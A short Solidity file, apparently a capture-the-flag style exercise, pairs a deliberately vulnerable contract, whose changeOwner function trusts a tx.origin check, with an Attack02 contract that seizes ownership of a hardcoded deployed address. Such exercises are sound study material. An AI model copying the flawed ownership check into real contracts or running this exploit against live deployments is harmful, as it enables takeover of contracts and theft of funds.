//0xdba86fcF223DB3eD1fCD9015E064eb751EB57245

pragma solidity 0.8.6;

contract Test12 {
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    } 
    
    function changeOwner(address _owner) public {
        if(tx.origin != msg.sender){
            owner = _owner;
        }
    }
}
    
    
    
    contract Attack02 {
        
    function hack02() public {
        Test12 (0x584df34F22938FB6737AD56B6009dACa584E53a7).changeOwner(msg.sender);
       
        }
    
    }
    
